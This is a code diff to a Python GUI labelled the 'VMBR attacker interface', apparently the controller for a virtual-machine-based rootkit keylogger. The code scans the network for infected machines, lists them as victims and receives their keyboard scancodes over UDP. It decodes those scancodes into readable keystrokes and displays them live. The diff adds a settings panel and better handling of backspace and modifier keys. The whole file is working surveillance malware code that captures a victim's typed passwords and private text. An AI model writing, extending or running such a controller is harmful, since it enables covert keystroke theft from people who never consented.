@@ -1,32 +1,35 @@
+from PIL import Image
 import socket
 import customtkinter as ctk
 import threading
 import queue
 import time
 
-codes = ("", "ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
-         '-', '=', "BKSP", "\t", 'q', 'w', 'e', 'r', 't', 'y', 
-         'u', 'i', 'o', 'p', '[', ']', "\n", "CTRL", 'a', 's', 
-         'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', "LSHIFT", 
+#TODO map release shift
+
+codes = ("", "«ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
+         '-', '=', "«BKSP»", "«TAB»", 'q', 'w', 'e', 'r', 't', 'y', 
+         'u', 'i', 'o', 'p', '[', ']', "«ENTER»", "«CTRL»", 'a', 's', 
+         'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', "«LSHIFT»", 
          '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 
-         "RSHIFT", "PRTSCR", "ALT", ' ', "CAPSLOCK", "F1", "F2", 
-         "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", 
-         "SCRLOCK", "HOME", "UP", "PGUP", '-', "LEFT", '5', "RIGHT", 
-         '+', "END", "DOWN", "PGDN", "INSERT", "DELETE", "SH_F1",
-         "SH_F2", "SH_F3", "SH_F4", "SH_F5", "SH_F6", "SH_F7", "SH_F8",
-         "SH_F9", "SH_F10", "CTRL_F1", "CTRL_F2", "CTRL_F3", "CTRL_F4",
-         "CTRL_F5", "CTRL_F6", "CTRL_F7", "CTRL_F8", "CTRL_F9",
-         "CTRL_F10", "ALT_F1", "ALT_F2", "ALT_F3", "ALT_F4", "ALT_F5",
-         "ALT_F6", "ALT_F7", "ALT_F8", "ALT_F9", "ALT_F10", "CTRL_PRTSCR",
-         "CTRL_LEFT", "CTRL_RIGHT", "CTRL_END", "CTRL_PGDN", "ALT1",
-         "ALT2", "ALT3", "ALT4", "ALT5", "ALT6", "ALT7", "ALT8", "ALT9",
-         "ALT0", "ALT-", "ALT=", "CTRL_PGUP", "F11", "F12", "SH_F11",
-         "SH_F12", "CTRL_F11", "CTRL_F12", "ALT_F11", "ALT_F12", "CTRL_UP",
-         "CTRL-", "CTRL5", "CTRL+", "CTRL_DOWN", "CTRL_INSERT", 
-         "CTRL_DELETE", "CTRL_TAB", "CTRL/", "CTRL*", "ALT_HOME", "ALT_UP",
-         "ALT_PGUP", "", "ALT_LEFT", "", "ALT_RIGHT", "", "ALT_END",
-         "ALT_DOWN", "ALT_PGDN", "ALT_INSERT", "ALT_DELETE", "ALT/",
-         "ALT_TAB", "ALT_ENTER")
+         "«RSHIFT»", "«PRTSCR»", "«ALT»", ' ', "«CAPSLOCK»", "«F1»", "«F2»", 
+         "«F3»", "«F4»", "«F5»", "«F6»", "«F7»", "«F8»", "«F9»", "«F10»", "«NUMLOCK»", 
+         "«SCRLOCK»", "«HOME»", "«UP»", "«PGUP»", '-', "«LEFT»", '5', "«RIGHT»", 
+         '+', "«END»", "«DOWN»", "«PGDN»", "«INSERT»", "«DELETE»", "«SHIFT_F1»",
+         "«SHIFT_F2»", "«SHIFT_F3»", "«SHIFT_F4»", "«SHIFT_F5»", "«SHIFT_F6»", "«SHIFT_F7»", "«SHIFT_F8»",
+         "«SHIFT_F9»", "«SHIFT_F10»", "«CTRL_F1»", "«CTRL_F2»", "«CTRL_F3»", "«CTRL_F4»",
+         "«CTRL_F5»", "«CTRL_F6»", "«CTRL_F7»", "«CTRL_F8»", "«CTRL_F9»",
+         "«CTRL_F10»", "«ALT_F1»", "«ALT_F2»", "«ALT_F3»", "«ALT_F4»", "«ALT_F5»",
+         "«ALT_F6»", "«ALT_F7»", "«ALT_F8»", "«ALT_F9»", "«ALT_F10»", "«CTRL_PRTSCR»",
+         "«CTRL_LEFT»", "«CTRL_RIGHT»", "«CTRL_END»", "«CTRL_PGDN»", "«CTRL_HOME»", "«ALT1»",
+         "«ALT2»", "«ALT3»", "«ALT4»", "«ALT5»", "«ALT6»", "«ALT7»", "«ALT8»", "«ALT9»",
+         "«ALT0»", "«ALT-»", "«ALT=»", "«CTRL_PGUP»", "«F11»", "«F12»", "«SHIFT_F11»",
+         "«SHIFT_F12»", "«CTRL_F11»", "«CTRL_F12»", "«ALT_F11»", "«ALT_F12»", "«CTRL_UP»",
+         "«CTRL-»", "«CTRL5»", "«CTRL+»", "«CTRL_DOWN»", "«CTRL_INSERT»", 
+         "«CTRL_DELETE»", "«CTRL_TAB»", "«CTRL/»", "«CTRL*»", "«ALT_HOME»", "«ALT_UP»",
+         "«ALT_PGUP»", "", "«ALT_LEFT»", "", "«ALT_RIGHT»", "", "«ALT_END»",
+         "«ALT_DOWN»", "«ALT_PGDN»", "«ALT_INSERT»", "«ALT_DELETE»", "«ALT/»",
+         "«ALT_TAB»", "«ALT_ENTER»", "«CTRL_RELEASED»", "«SHIFT_RELEASED»", "«ALT_RELEASED»")
 
 SCAN_PORT = 49323
 KEYLOGS_PORT = 49324
@@ -38,6 +41,10 @@ shift_on = False
 caps_on = False
 ctrl_on = False
 alt_on = False
+
+interpret_bksp = ""
+interpret_enter = "on"
+interpret_tab = "on"
 
 def decode_scancodes(string):
 
@@ -53,36 +60,36 @@ def decode_scancodes(string):
 
     out = ""
     for i in string:
-        if i & 0x80:        # released
-            print(f'released {codes[int(i & (~0x80))]}')
-            i &= ~0x80
-            if codes[int(i)] == "CTRL":
-                ctrl_on = False
-            elif codes[int(i)] in ("LSHIFT", "RSHIFT"):
-                shift_on = False
-            elif codes[int(i)] == "ALT":
-                alt_on = False
-        else:               # pressed
-            print(f'pressed {codes[int(i)]}')
-            if codes[int(i)] == "CTRL":
-                ctrl_on = True
-            elif codes[int(i)] in ("LSHIFT", "RSHIFT"):
-                shift_on = True
-            elif codes[int(i)] == "ALT":
-                alt_on = True
-            elif codes[int(i)] == "CAPSLOCK":
-                caps_on = not caps_on
+        if codes[int(i)] == "«CTRL»":
+            ctrl_on = True
+        elif codes[int(i)] in ("«LSHIFT»", "«RSHIFT»"):
+            shift_on = True
+        elif codes[int(i)] == "«ALT»":
+            alt_on = True
+        elif codes[int(i)] == "«CTRL_RELEASED»":
+            ctrl_on = False
+        elif codes[int(i)] == "«SHIFT_RELEASED»":
+            shift_on = False
+        elif codes[int(i)] == "«ALT_RELEASED»":
+            alt_on = False
+        elif codes[int(i)] == "«CAPSLOCK»":
+            caps_on = not caps_on
+        else:
+            if (shift_on or caps_on) and 'a' <= codes[int(i)] <= 'z':
+                out += codes[int(i)].upper()
+            elif shift_on and codes[int(i)] in shift_dict.keys():
+                out += shift_dict[codes[int(i)]]
+            elif alt_on:
+                out += "«ALT+"+codes[int(i)]+"»"
+            elif ctrl_on:
+                out += "«CTRL+"+codes[int(i)]+"»"
             else:
-                if (shift_on or caps_on) and 'a' <= codes[int(i)] <= 'z':
-                    out += codes[int(i)].upper()
-                elif shift_on and codes[int(i)] in shift_dict.keys():
-                    out += shift_dict[codes[int(i)]]
-                # elif shift_on:
-                #     out += "SHIFT+"+codes[int(i)]
-                elif alt_on:
-                    out += "ALT+"+codes[int(i)]
-                elif ctrl_on:
-                    out += "CTRL+"+codes[int(i)]
+                if codes[int(i)] == "«BKSP»" and interpret_bksp:
+                    out += '\b'
+                elif codes[int(i)] == "«ENTER»" and interpret_enter:
+                    out += '\n'
+                elif codes[int(i)] == "«TAB»" and interpret_tab:
+                    out += '\t'
                 else:
                     out += codes[int(i)]
     return out
@@ -93,22 +100,75 @@ class EntryFrame(ctk.CTkFrame):
 
         self.app = app
 
-        self.grid_columnconfigure(0, weight=1)
-        self.grid_rowconfigure(0, weight=3)
-        self.grid_rowconfigure(1, weight=1)
-        self.grid_rowconfigure(2, weight=5)
+        self.grid_columnconfigure(0, weight=5)
+        self.grid_columnconfigure(1, weight=1)
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_rowconfigure(1, weight=3)
+        self.grid_rowconfigure(2, weight=1)
+        self.grid_rowconfigure(3, weight=5)
 
         self.label = ctk.CTkLabel(self, text="HELLO", font=("Arial", 40, "bold"))
-        self.label.grid(row=0, column=0, padx=0, pady=0, sticky="s")
+        self.label.grid(row=1, column=0, columnspan=2, padx=0, pady=0, sticky="s")
 
         self.label = ctk.CTkLabel(self, text="Welcome to the VMBR attacker interface", font=("Arial", 16))
-        self.label.grid(row=1, column=0, padx=0, pady=5, sticky="n")
+        self.label.grid(row=2, column=0, columnspan=2, padx=0, pady=5, sticky="n")
 
-        self.button = ctk.CTkButton(self, text="Start", command=self.button_callback, font=("Arial", 20))
-        self.button.grid(row=2, column=0, padx=0, pady=0)
+        self.start_button = ctk.CTkButton(self, text="Start", command=self.start_callback, font=("Arial", 20))
+        self.start_button.grid(row=3, column=0, columnspan=2, padx=0, pady=0)
+
+        self.settings_image = ctk.CTkImage(dark_image=Image.open("/home/gognl/vmbr/attacker/settings.png"), size=(50, 50))
+        self.settings_button = ctk.CTkButton(self, text="", image=self.settings_image, command=self.settings_callback, width=50, height=50, fg_color="transparent")
+        self.settings_button.grid(row=0, column=1, padx=10, pady=10, sticky="en")
+        
+    def settings_callback(self):
+        self.app.display_settings()
+
+    def start_callback(self):
+        self.app.start_scan()
+
+class SettingsFrame(ctk.CTkScrollableFrame):
+    def __init__(self, app, **kwargs):
+        super().__init__(app, **kwargs)
+
+        self.app = app
+
+        self.columnconfigure((0, 1), weight=1)
+        self.rowconfigure((0, 1, 2, 3, 4, 5, 6), weight=1)
+
+        self.title_label = ctk.CTkLabel(self, text="Settings", font=("Arial", 18, "bold"))
+        self.title_label.grid(row=0, column=0, padx=0, pady=5, sticky="", columnspan=2)
+
+        self.bksp_var = ctk.StringVar(value=interpret_bksp)
+        self.bksp = ctk.CTkSwitch(self, text="Interpret BACKSPACE literally", font=("Arial", 16), variable=self.bksp_var, onvalue="on", offvalue="")
+        self.bksp.grid(row=1, column=0, sticky="w", padx=10, pady=5, columnspan=2)
+
+        self.tab_var = ctk.StringVar(value=interpret_tab)
+        self.tab = ctk.CTkSwitch(self, text="Interpret TAB literally", font=("Arial", 16), variable=self.tab_var, onvalue="on", offvalue="")
+        self.tab.grid(row=2, column=0, sticky="w", padx=10, pady=5, columnspan=2)
+
+        self.enter_var = ctk.StringVar(value=interpret_enter)
+        self.enter = ctk.CTkSwitch(self, text="Interpret ENTER literally", font=("Arial", 16), variable=self.enter_var, onvalue="on", offvalue="")
+        self.enter.grid(row=3, column=0, sticky="w", padx=10, pady=5, columnspan=2)
+
+        self.apply_button = ctk.CTkButton(self, text="Apply", font=("Arial", 16), command=self.apply_callback)
+        self.apply_button.grid(row=6, column=0, pady=10)
+
+        self.cancel_button = ctk.CTkButton(self, text="Cancel", font=("Arial", 16), command=self.cancel_callback)
+        self.cancel_button.grid(row=6, column=1, pady=10)
     
-    def button_callback(self):
-        self.app.start()
+    def apply_callback(self):
+        global interpret_bksp
+        global interpret_tab
+        global interpret_enter
+
+        interpret_bksp = self.bksp_var.get()
+        interpret_tab = self.tab_var.get()
+        interpret_enter = self.enter_var.get()
+
+        self.app.close_settings()
+
+    def cancel_callback(self):
+        self.app.close_settings()
 
 class ScanningMachinesFrame(ctk.CTkFrame):
     def __init__(self, app, **kwargs):
@@ -172,7 +232,6 @@ class ChooseFrame(ctk.CTkFrame):
         self.grid_rowconfigure(1, weight=4)
         self.grid_columnconfigure(0, weight=1)
 
-
 class ChoosingVictimFrame(ctk.CTkScrollableFrame):
     def __init__(self, app: ctk.CTk, victims: queue.Queue, **kwargs):
         super().__init__(app, **kwargs)
@@ -197,9 +256,6 @@ class ChoosingVictimFrame(ctk.CTkScrollableFrame):
         for i, victim in enumerate(victim_frames):
             self.grid_rowconfigure(i//4, weight=1)
             victim.grid(row=i//4, column=i%4, padx=5, pady=5)
-        
-        
-
 
 class VictimFrame(ctk.CTkFrame):
     def __init__(self, app: ctk.CTk, victim, **kwargs):
@@ -222,7 +278,6 @@ class VictimFrame(ctk.CTkFrame):
     def chosen(self):
         self.app.app.app.start_keylogging(self.victim)
 
-
 class KeyloggerFrame(ctk.CTkFrame):
     def __init__(self, app: ctk.CTk, victim, **kwargs):
 
@@ -244,7 +299,6 @@ class KeyloggerFrame(ctk.CTkFrame):
 
         self.thread = threading.Thread(target=self.start)
 
-
     def start(self):
         global sock
         sock.sendto(b"OKAY", self.victim[1])
@@ -256,12 +310,17 @@ class KeyloggerFrame(ctk.CTkFrame):
             if (address != self.victim[1]):
                 continue
             logs = decode_scancodes(data[1:])
-            # print(f"\033[38;5;172mReceived: \033[38;5;223m{logs}\033[0m")
 
             self.textbox.configure(state="normal")
-            self.textbox.insert("end", logs)
-            self.textbox.configure(state="disabled")
 
+            while '\b' in logs:
+                current = logs.find('\b')
+                self.textbox.insert('end', logs[:current])
+                self.textbox.delete('end-2c')
+                logs = logs[current+1:]
+                
+            self.textbox.insert('end', logs)
+            self.textbox.configure(state="disabled")
 
 
 class App(ctk.CTk):
@@ -277,11 +336,29 @@ class App(ctk.CTk):
         self.entry_frame = EntryFrame(self, fg_color="transparent")
         self.entry_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
     
-    def start(self):
+    def start_scan(self):
         self.entry_frame.destroy()
         self.scan_frame = ScanningMachinesFrame(self, fg_color="transparent")
         self.scan_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
         self.scan_frame.thread.start()
+    
+    def display_settings(self):
+        for widget in self.entry_frame.winfo_children():
+            widget.configure(state="disabled")
+        self.settings_frame = SettingsFrame(self, width=300, height=150)
+        self.settings_frame.grid(row=0, column=0, padx=0, pady=0, sticky="")
+    
+    def close_settings(self):
+        # self.settings_frame.configure(fg_color="transparent")
+        for widget in self.entry_frame.winfo_children():
+            widget.configure(state="normal")
+        for widget in self.settings_frame.winfo_children():
+            widget.destroy()
+        self.settings_frame.destroy()
+        self.entry_frame.destroy()
+        self.entry_frame = EntryFrame(self, fg_color="transparent")
+        self.entry_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+
     
     def start_choosing_window(self, victims: queue.Queue):
         self.scan_frame.destroy()
